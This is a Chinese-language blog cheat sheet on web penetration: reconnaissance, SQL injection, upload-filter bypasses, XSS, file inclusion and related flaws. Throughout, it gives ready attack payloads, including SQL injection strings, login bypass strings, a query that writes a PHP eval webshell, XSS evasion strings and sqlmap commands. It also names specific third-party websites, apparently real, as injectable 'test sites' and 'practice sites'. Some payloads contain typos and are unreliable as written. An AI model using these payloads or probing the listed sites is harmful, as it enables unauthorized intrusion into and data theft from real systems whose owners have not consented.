---
layout:     post
title:      web渗透知识纵横
subtitle:   web漏洞汇总
date:       2017-05-12
author:     volcanohatred
header-img: img/articles/web渗透知识纵横/title.jpg
catalog: true
tags:
    - web渗透
    - 总结
---


# 1.信息收集
## 1.1域名信息
获取ip信息：工具：ping得到ip，nslookup，站长工具。  
查找子域名：子域名站一般防御较差，着重点。而且子域名一般是真实ip，谷歌语法获取子域名：inurl：xx.com。工具：layer子域名挖掘机，subdomainbrute。子域名所在服务器版本低的，与目标站点在同一c段或者同一服务器的站点，可以作为攻击目标。  
查找whois（注册人）信息：工具：爱站，站长工具。反查：同一注册名注册的不同站，得到的信息可用于社工和密码猜解。
## 1.2目录信息
robots.txt：robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。通过robots.txt可以看到一些敏感目录。  
备份文件：安装包，网站码源，数据库备份文件。扫目录有时可以扫出来，类似1.rar,xx.mdb等。  
上传目录：fckeditor,ewebedit,ckfinder编辑器上传接口。  
mysql管理接口：phpmyadmin(pmd,pma,phadmin.phpadmin)  
安装页面:install.php.lock  
根路径：报错显示，读配置文件。  
c:/windows/system32/inetsrv/metabase.xml
phpinfo:php信息  
编辑器，iis短文件，后台目录。  
工具：御剑（暴力破解）
OWASP DirBuster（安全狗对百度，360爬虫加入白名单，可修改useragent绕过拦截）（暴力破解）
爬行：awvs，burpsuite，爬链接。
## 1.3旁站c段
工具：k8旁站工具
      多平台旁站c段查询（推荐）

## 1.4整站分析
操作系统(linux，windows)：大小写测试。当然也不一定。  
容器（iis,apache,nginx,tomcat,jboss）：:抓包分析，看响应头。  
脚本格式（asp，aspx，php，jsp，py）：看url，index.xx测试。  
数据库类型（access，mssql，mysql，oracle，db2，postgresql)：端口，报错信息。  
防护情况(waf)：and 1=1测试。  
cms类型(dedecms,diguo,dz,meterinfo)：云悉指纹识别。readme.txt，使用说明.txt，网页最下面。

## 1.5端口信息
常用端口：21，22，23，110（pop3)，80，808X，1433，3306，1521，3389，9090（websphere）  
端口只是参考！！基本上一些有点安全意识的管理员会改端口。  
工具：portscan，scanport，Nmap
## 1.6谷歌语法
intext:查看内容关键字
intitle:查找某个标题
inurl:查找url中带某字段的网站
site：site:jp日本站
比如：织梦后台：intext：power by dedecms...

## 1.7CDN绕过
（对服务器进行爆破，或者以入侵服务器为目的时，注入则无需考虑）  
检测：
爱站ping检测，站长之家也可以，查看是否有cdn  
查看二级域名，一般主域名才会架设cdn  
发送邮件（显示邮件信息）  
敏感文件泄露（phpinfo）  
查看历史解析（ip138）  
网站提供的app抓包  
绕过方法：修改hosts文件。

# 2.工具使用

# 3.WEB漏洞
## 3.1网站暴库漏洞
此类漏洞以access数据库居多，数据库文件形式：data.mdb  
mssql,mysql则要找数据库链接文件(前提找到了数据库路径)  
漏洞寻找：  
在百度搜索转到父目录，目录遍历  
intext:to parent directory+intext:mdb site:xx.com  
::$data  
%5c和inc/conn.asp暴库(针对access+iis，一般为asp)  
用法：把要提交的网页url中的二级以上目录/换成%5c，然后提交就可以得到数据库地址  
数据库防下载
123.mdb 下载时对文件名进行url编码
有目录管理权限可以先改名，后下载
## 3.2下载漏洞
xx/down.asp?file=xx/xx/xx/  
改路径下载conn.asp,config.php等
## 3.3网站后台弱口令
爆破，cms默认口令  
常见后台路径  
万能密码 'or'a'='a   admin #   
测试站点：http://www.loverz.cn/admin.php  
爆破工具：带验证码 pkav http fuzzer 图形识别技术  
## 3.4cms漏洞
通过信息收集拿到cms信息，百度相关cms漏洞，或者搭建平台自己挖掘漏洞。
## 3.5注入漏洞
### 3.5.1 布尔型盲注,get型注入
手工注入就是执行sql语句  
先判断数据库什么类型  
```
and (select count(*) from msysobject)>0 access
and (select count(*) from sysobject)>0 mssql
```  
判断注入  
```
-0,and 1=1,and 1=2,/
```  
判断列名  
```
and exsits (select * from 表)> 0
```  
判断制定表列长度  
```
select * from 表 order by len
```  
联合查询  
```
union selsect 1,2......(len) from 表 选中列的数据类型不一致导致报错
```  
判断账户/密码长度  
```
and (select len(账户名/密码名) from admin)=len 
``` 
通过asc判断(注：并不是所有的数据库系统都支持SELECT TOP子句。MySQL支持LIMIT子句来选择有限数量的记录，而Oracle使用ROWNUM)  
```
and (select top 1 asc(mid(admin,1,1)) from admin)>100 admin列第一行第一个字的ascii(sqlmap原理）
```
测试站点：  www.jnqtly.cn/cp11.asp?id=1129
www.fc1885.com/display1_new.asp?id=237
工具：阿d,sqlmap,pangolin
### 3.5.2偏移注入(猜不到列名）
用*代替向前逐个删除，直到不报错为止  
删除的个数为一个周期  
```
union select ........ * from admin
union select ........ * from (admin as a inner join admin as b on a.id=b.id)
union select ........ * from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)
```  
### 3.5.3跨库查询
A,B站搭建在同一服务器，知道B的绝对路径，通过A来进行联合查询  
mssql  
数据库文件：mdf,日志文件：ldf。  
找数据库连接文件 一般在inc/conn.asp,dbconfig.asp,aspx(web.config)  
判断注入  
同access  
判断数据库版本  
```
and 1=(select @@version)  原理是类型不同导致报错 id=@@version
```  
判断当前数据库名称  
```
and 1=(select db_name)  id=db_name
```  
查看所有数据库  
```
and 1=(select name from master..sysdatabases for xml path)
```  
查看除系统数据库外的其他数据库  
```
and 1=(select top 1 name from master..sysdatabases where dbid>4) 
```  
获取表名  
```
and 1=(select top 1 name from sysobjects where xtype=’u’)
```   
获取列名  
```
and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name =’admin’) 
```  
查看值  
```
and 1=(select top 1 admin from admin) 
```  
基本信息收集  
权限判断  
```
and 1=(select is_srvrolemember(‘sysadmin’)) 
```  
服务名  
```
and 1=(select @@servername) 
```  
如果为sa权限,可以进行扩展存储注入攻击,写入一句话等。  
 
测试站点：  http://testasp.vulnweb.com/showforum.asp?id=0
           http://www.langesteel.com/onew11.asp?id=42574

工具：阿d,sqlmap,pangolin
mysql
一些常用函数  
```
Database() 数据库名
Version() 数据库版本
Load_file() 读取本地文件
@@datadir  读取数据库路径
@@basedir   mysql安装路径
@@version_compile_os   操作系统
常用数据库连接文件：config.php db_config.php include/common.inc.php
```  

单引号做过滤问题，16进制转化，16进制注入攻击
  
Mysql 4.0不支持手工注入  
Mysql显错注入，针对单引号查询 -99999999999  
后台绕过，万能密码，注入  
添加提交"/*"，返回错误页面，说明数据库不是MySQL的。继续在注入点链接后添加"--"，显示正常页面，说明数据库可能为MSSQL和Oracle。再提交：  
写入一句话：  
```
Union select 1,”<?php eval($_GET[x];?>”,3 into outfile ‘c:/XX’,可以把系统命令放入bat开机自启
魔术引号与宽字节注入（Php 5.3.0以后废弃）
```  
Sqlmap --tamper unmagicquotes.py
1.16进制转译，读的时候
%bf%27
其他数据库注入  
www.kelichina.com  
www.szxcc.com   
Oracle  
dual   
Order by 前提时支持联合查询
有注入的话联合查询
Union select null,null,null from dual,用’null’判断是否为字符，用数字判断是否为数字
Postgresql
判断是否为postgresql数据库  
```
+and+1::int=1--(加号代表空格)
```  
判断数据库版本  
```
+and+1=cast(version() as int)--
```   
判断字段  
``` 
Order by
```
### 3.5.3 其他注入方式
post注入  
注册用户  
登陆账号，修改账户  
留言  
修改个人资料  
上传资料   
加单引号报错，抓包用sqlmap跑  %bf  
sqlmap  -u “xxx” -r
自动识别表单  
Sqlmap   -u “xxx” --form  
表单里面可能存在注入[]  
cookies注入  
类似post，对代码级防御进行绕过，get不能注入的  
sqlmap  -u “xxx” --cookie “id=x”  
手工注入：不推荐，太麻烦，直接sqlmap，或者穿山甲  
汉字型注入  
www.xxx.com/xx.asp?id=’你好’ and 1=1#’  
搜索型注入  
搜索框  
测试站点：www.ptc-asia.com/cn/ci/?cid=62  
伪静态注入  
xxx.com/index.php/id/131.html  
用工具跑的时候，对注入点强制加星 *  
延迟注入  
通过页面返回的时间来判断  
and sleep(4) 延迟4秒  
Base64编码注入  
一些站点需要编码后才能识别  
Sqlmap   -u “xxx” --tamper=base64encode.py  
二阶注入  
一阶注入即平时所说的注入
二阶注入即恶意代码不立即执行，存储到后端数据库，在处理另一次不同请求时，代码被执行。
比如：注册时构造恶意代码，注册完查看消息时爆出数据库数据。
Authkey注入
Phpcms v9
http头注入
抓包，可能存在的注入点：
Referer:
x-forward-for :
User-agent
client-ip:
双引号无法存在
awvs会自动监测
Xml实体注入
比较少见
注意闭合！！！！
‘)and 1=1#
app注入漏洞挖掘
基本走的http
Burpsuite

## 3.6上传漏洞
iis 5.x 6.x 解析漏洞
1.目录解析  创建目录
2. 分号解析   xx.asp;.jpg
3.畸形文件名解析  xx.asa xx.cer xx.cdx
Apache解析漏洞
Apache从右到左判断解析，如果为不可识别解析，就从左往右
X.php.
htaccess文件解析

Iis 7.0/7.5  nginx<8.03畸形解析漏洞
Iis php->>>    xx.jpg/.php
Asa cer可被解析为php,
Nginx<8.03   xx.php%00.jpg
 


服务器命名规则：上传文件和服务器命名已知；不一致：时间戳，随机xx.asp;xx.jpg


常见上传方式检测及突破：
1.本地javascript检测
比较少见，抓包，看是否走的网络，未发送。
突破：编辑html。
      上传正常文件抓包，改包 
2.服务端mime类型检测（检测content_type)
       抓包，修改content_type类型
3.服务端路径检测
什么都可以上传，但是上传的目录无法脚本执行
       上传文件抓包改名：../xx.asp  
        修改上传路径，上传到上层，目录目录权限限制
4.服务端文件扩展名检测
黑名单检测；白名单检测（安全）
       文件名后缀大小写修改（Asp,PHp），畸形修改（asp.,php.），改为asa，cer
       00截断 xx.php%00.jpg.%00编码
       .htaccess文件攻击（一般无权限）
       配合解析漏洞
       双文件上传：抓包上传两个文件，第一个正常文件，第二个改后缀
5.服务端文件内容检测
        制作图片马，图片末尾检测，waf会识别
        二次渲染：上传不完整的图片让其渲染函数暴露，对文件加载器攻击
其他：
无上传按钮，可能是上传路径  编辑html  
<input type=”submit” value=”提交” name=”bb”>


## 3.7目录遍历漏洞
加变量&dir=../

## 3.8编辑器漏洞
1.百度，查看编辑器特有漏洞
2.上传点

查找编辑器路径
爬行，暴力破解
递归扫描，很多编辑器会放在管理员目录
查看图片上传目录
谷歌语法：site:xx.com inurl:editor

突破上传 
上传点，创建目录。 xx.asp/xx.asp
思路要活。
在url中输入%00会自动截断

模糊测试  xx.asp.;.jpg 绕过asp;.jpg变asp_jpg

## 3.9XSS跨站
Cookies有时限性
还会得到后台地址

难点：挖掘，标签闭合，绕过  
```
<script>alert(‘xss’)</script>
```  
document对象
Js变量定义 var 变量
Js时间 onclick属性 点击事件

Xss分类
反射型xss
非持久型，点击一次执行一次，发送给受害者
Dom型xss
存储型xss
可能对web服务器的自身安全有威胁，注入到服务器


数据交互的地方，加代码
审查元素看是否需要闭合，有的标签不需要闭合，有的则要闭合
存在注入的地方都可能存在xss
手工挖掘与工具挖掘
用户输入搜索的地方，文件上传，flash等
标签中间，直接闭合，标签属性中  
```
<div value=”123”><script>alert(/xss/)</script>”>
```  
留言的地方
盲打cookies
注册：xss.fbisb.com创建模块，

绕过：  
大小写混淆   
```
<scRIPTt>alert(‘xss’)</script>
```  
重叠   
```
<scscriptt>alert(‘xss’)</script>
```  
魔术引号  字符串转化
启用了httponly  伪造登陆界面，拿后台密码
标签插入字符： 换标签

Xss平台搭建：百度

工具：awvs。。。

## 3.10Csrf漏洞
难
利用高权限做事
防御：refer  

## 3.11其他漏洞
Php相关漏洞  
文件包含漏洞 php很多，其他少  
利用包含绕过waf，留后门，读敏感文件(日志，配置文件，访问的url中加入一句话，再访问日志)  
如何挖掘  www.xx.com/index.php?file=../../xx.php
<?=include($_GET(c));?>  包含jpg，以php代码运行了，如果不能执行，则显示内容。
其他情况：
<?php 
Include”$_GET(c).”.php”;
?>   加%00
看php源代码,编码：php://filter/read=convert.base64-encode/resource=xx.php
远程包含：allow_url_include=true
php输入输出流
Php://input插入一句话木马
用来接受post数据
代码执行漏洞
Php中可以执行代码的函数：eval(),exec(),system()(需要系统权限),等
Xx.com/a.php?a=system(ipconfig); a.php里是一句话
动态代码执行
<?php
$a=$_GET[‘a’];
$b=$_GET[‘b’];
$a($b);
?>

http://xx.com/x.php?a=system&b=ipconfig
练习站点：（海洋cms）

http://www.kudian365.com/search.php?
www.77dvd.com
www.bgdyhd.com(www.bgdyhd.com/search.php?searchtype=5&tid=&area=phpinfo())
https://www.piaohuatv.tv/search.php?searchtype=5&tid=&area=phpinfo()
 

变量覆盖漏洞
<?php
$auth=’0’;
Extract($_GET)；
If($auth=’1’){
Echo “登陆成功”；
}else{
Echo “你还没登陆，请重新登陆”；
?>
改变auth的值，绕过认证
xx.com/a.php?auth=1
也可以二次安装


Jsp相关漏洞(权限相对较高)

Struts2漏洞
大型企业，等等
如何挖掘：后缀：.do,.action ;登陆，注册，留言的地方
Checklog.action xx.action
工具：k8 struts2 exp
测试站点：http://oa.lzlqc.com/userLogin.action






Java反序列
工具：Java反序列化测试工具



Tomcat部署漏洞
Tomcat\conf\server.xml
有的管理员自己都没设置，所以最后没办法再测
如果能进入管理界面，上传文件war，部署
Weblogic攻击
Weblogic管理端口 http：7001 https：7002 
Inurl：console
上传war包，部署，和tomcat相同
越权漏洞
水平越权
纵向越权
如何挖掘：数据交互的地方
          用户操作的地方
          参数可控制的地方
Burp抓包，改包
逻辑漏洞
密码找回，支付漏洞。验证码爆破
如何挖掘：数据交互的地方
          用户操作的地方
          参数可控制的地方
后台登陆验证，响应包改为true
Burp：do intercept->response to this request->forward
Burp抓包，改包

ssrf跨站
image=其他站点调用